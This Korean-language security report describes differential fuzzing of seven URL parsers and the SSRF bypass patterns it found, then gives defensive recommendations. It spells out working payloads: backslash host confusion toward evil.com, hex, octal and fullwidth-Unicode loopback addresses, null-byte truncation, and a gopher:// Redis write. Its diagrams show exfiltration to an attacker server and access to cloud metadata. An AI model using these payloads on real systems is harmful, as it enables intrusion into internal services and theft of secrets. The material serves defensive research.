1. Executive Summary

7개의 URL 파서를 대상으로 differential fuzzing을 수행한 결과, 320개의 고유한 파싱 불일치 패턴을 발견했다. 이 중 72개는 SSRF(Server-Side Request Forgery)로 직결되는 CRITICAL 등급이다.

핵심 발견: "파서 A로 URL을 검증하고, 파서 B로 실제 요청을 보내는" 모든 아키텍처가 취약하다. 파서마다 동일한 URL을 완전히 다르게 해석하며, 이 차이가 곧 보안 취약점이 된다.

4. Top Attack Patterns

4.1. Backslash Authority Confusion CRITICAL
http://evil.com\@good.com/path
urllib (Python)
userinfo=evil.com\, host=good.com
WHATWG (Node.js)
host=evil.com, path=/@good.com/path
Attack: urllib로 검증 → host=good.com(안전) → WHATWG로 요청 → host=evil.com(공격자 서버). 24+ variants found.
4.2. Hex/Octal IP Normalization CRITICAL
http://0x7f000001/admin   |   http://0177.0.0.1/admin   |   http://0x7f.0x0.0.1/admin
urllib (Python)
host=0x7f000001 (문자열 그대로 — blocklist에 없음)
curl / WHATWG / legacy
host=127.0.0.1 (정규화된 내부 IP)
Attack: SSRF 차단 목록을 완전 우회. urllib는 hex/octal IP를 정규화하지 않아 문자열 비교 기반 필터가 무력화된다. 20+ variants found.
4.3. NULL Byte Host Truncation CRITICAL
http://good.com%00.evil.com/path   |   file://attacker.com%00@127.0.0.1/
urllib (Python/JS)
host=good.com%00.evil.com (전체 문자열)
curl (C-based)
host=good.com (NULL에서 절단)
Attack: C 기반 라이브러리(curl/libcurl)와 Python/JS 간의 근본적 문자열 처리 차이. 가장 빈번한 패턴: 54 variants.
4.4. Fullwidth Unicode Digit IP CRITICAL
http://%ef%bc%91%ef%bc%92%ef%bc%97.0.0.1/
urllib (Python)
host=%ef%bc%91%ef%bc%92%ef%bc%97.0.0.1 (문자열 그대로)
WHATWG (Node.js/Browser)
host=127.0.0.1 (Unicode 정규화 후 IP 인식)
Attack: 가장 깔끔한 SSRF 우회 벡터. Fullwidth "127"(U+FF11 U+FF12 U+FF17)이 WHATWG에서 정규화된다. WAF 탐지 극히 어려움.
4.5. Double-Bracket IPv6 Confusion CRITICAL
http://[[::1]]/path
urllib (Python)
host=[::1 (첫 ]에서 파싱 종료, 유효하지 않은 호스트)
legacy (Node.js url.parse)
host=[::1] (올바른 IPv6 루프백)
Attack: IPv6 대괄호 처리 edge case. 차단 목록에 [::1은 없으므로 우회 가능.
4.6. Percent-Encoded Dot + Hex IP (이중 우회) CRITICAL
https://0x7f%2e0%2e0%2e1/path
urllib (Python)
host=0x7f%2e0%2e0%2e1 (디코딩 안 함)
WHATWG (Node.js)
host=127.0.0.1 (디코딩 + hex 정규화)
Attack: 인코딩 + IP 표기법 이중 우회. WAF 탐지가 극도로 어렵다.
4.7. Incomplete IP Auto-Completion HIGH
http://127.0.0./path
urllib (Python)
host=127.0.0. (불완전 IP, 외부로 판단)
WHATWG (Node.js)
host=127.0.0.0 (자동 완성된 내부 IP)
Attack: 마지막 옥텟 생략이라는 단순한 트릭으로 SSRF 차단 우회.
4.8. Non-HTTP Scheme SSRF HIGH
gopher://127.0.0.1:6379/_SET%20pwned%20true   |   ftp://localhost:\@external.com/..
All parsers
gopher, ftp, telnet, file 등 비-HTTP 스킴에서 authority 파싱 규칙이 상이
Impact
SSRF 필터가 http/https만 검사하는 경우 완전 우회

5. Real-World Attack Scenarios

Scenario A: Python Backend + Node.js Proxy

[Attacker] ---> http://evil.com\@api.internal/admin
                     |
         [Python urllib validation]
         host = "api.internal"  (safe, in allowlist)
         result: PASS
                     |
         [Node.js WHATWG fetch proxy]
         host = "evil.com"  (backslash normalized to /)
         result: Request sent to evil.com
                     |
[Attacker Server] <--- receives internal API request

Affected pairs: urllib vs WHATWG (100 findings), urllib vs rfc3986 (90 findings)

Scenario B: Python + curl/requests Backend

[Attacker] ---> http://0x7f000001/admin/secret
                     |
         [Python urllib SSRF filter]
         host = "0x7f000001"  (not in blocklist: "127.0.0.1")
         result: PASS
                     |
         [requests/curl HTTP client]
         host = "127.0.0.1"  (hex normalized)
         result: Request sent to localhost:80/admin/secret
                     |
[Internal Service] <--- SSRF achieved, secrets exfiltrated

Affected pairs: urllib vs curl (62 findings). Also works with octal (0177.0.0.1), decimal (2130706433), fullwidth (U+FF11U+FF12U+FF17.0.0.1)

Scenario C: Frontend Validation + Browser Fetch

[Attacker] ---> http://%ef%bc%91%ef%bc%92%ef%bc%97.0.0.1/
                     |
         [Server-side Python validation]
         host = "%ef%bc%91%ef%bc%92%ef%bc%97.0.0.1"
         Not in blocklist -> PASS
                     |
         [Browser/Node.js WHATWG fetch]
         Fullwidth "127" normalized -> host = "127.0.0.1"
         result: Browser fetches from localhost
                     |
[Cloud Metadata] <--- http://169.254.169.254/ accessible

7. Defense Recommendations

Rule #1: Same Parser Principle (가장 중요)

[WRONG]  Parser A로 검증 -> Parser B로 요청
[RIGHT]  Parser B로 검증 -> Parser B로 요청 (동일 파서 사용)

URL 검증과 실제 요청에 반드시 동일한 파서를 사용해야 한다. 파서가 다르면 아무리 엄격한 검증도 우회 가능하다.

Rule #2: IP Address Normalization

모든 IP 표기법을 표준 dotted-decimal로 변환 후 비교:

hex:       0x7f000001     -> 127.0.0.1
octal:     0177.0.0.1     -> 127.0.0.1
decimal:   2130706433     -> 127.0.0.1
fullwidth: U+FF11U+FF12U+FF17.0.0.1 -> 127.0.0.1
IPv6-map:  ::ffff:7f00:1  -> 127.0.0.1
short:     127.1          -> 127.0.0.1

Rule #3: Input Sanitization

1. Backslash(\) 포함 URL -> REJECT
2. NULL byte(%00) 포함 URL -> REJECT
3. 비-HTTP 스킴(gopher, file, ftp, telnet, jar, jndi) -> REJECT
4. Percent-encoding in host -> DECODE first, then validate
5. Unicode in host -> NFKC normalize, then validate

Rule #4: Allowlist over Blocklist

[WRONG]  if host not in blocklist: allow    # 무한히 우회 가능
[RIGHT]  if host in allowlist: allow          # 정규화 후 비교

Rule #5: DNS Resolution Validation

# 파싱된 호스트가 아닌, 실제 DNS 결과로 검증
resolved_ip = socket.getaddrinfo(host, port)
if is_internal(resolved_ip):
    reject()  # DNS rebinding 방어
